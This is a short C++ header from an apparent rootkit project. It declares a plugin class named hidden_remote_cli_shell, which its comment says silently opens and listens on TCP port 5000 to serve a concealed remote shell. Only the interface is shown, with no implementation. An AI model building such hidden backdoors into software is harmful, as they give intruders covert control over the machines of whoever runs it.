//
// Created by idan on 12/30/23.
//

#ifndef ROOTKIT_HIDDEN_REMOTE_CLI_SHELL_H
#define ROOTKIT_HIDDEN_REMOTE_CLI_SHELL_H

#include "../../../basic/basic_plugin.h"
#include "../../../basic/network/tcp_port.h"

// silently opens a tcp port and listens on it
class hidden_remote_cli_shell : public basic_plugin {
    tcp_port my_port {5000};

public:

    void run() override;

    void stop() override;
};


#endif //ROOTKIT_HIDDEN_REMOTE_CLI_SHELL_H
